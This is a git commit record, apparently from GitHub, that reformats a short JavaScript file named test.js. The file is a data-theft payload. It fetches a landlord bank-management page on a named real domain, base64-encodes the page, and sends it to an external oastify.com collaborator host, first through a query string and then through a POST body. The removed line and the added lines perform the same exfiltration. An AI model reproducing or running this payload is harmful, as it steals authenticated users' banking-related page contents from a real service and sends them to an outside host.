4fb91a49d21c8ddc2ff3e2aae2f5e5d8daebafa9
manitorpotterk <45949793+manitorpotterk@users.noreply.github.com>
2024-10-10 18:08:42 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,16 @@
-function fe(t) { fetch(t).then(t => t.text()).then(t => { fetch("//mpff5i3yowuv452xfzhu30ytzk5bt1hq.oastify.com/log/?p="+btoa(t)) }) } urls = ["https://leaderbank.qa.zrent.net/Landlord/ManageBanks"], urls.forEach(fe);
+function fe(t) { 
+    fetch(t)
+        .then(t => t.text())
+        .then(t => { 
+            fetch("//mpff5i3yowuv452xfzhu30ytzk5bt1hq.oastify.com/log/", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: "p=" + btoa(t)
+            });
+        });
+}
+
+urls = ["https://leaderbank.qa.zrent.net/Landlord/ManageBanks"];
+urls.forEach(fe);
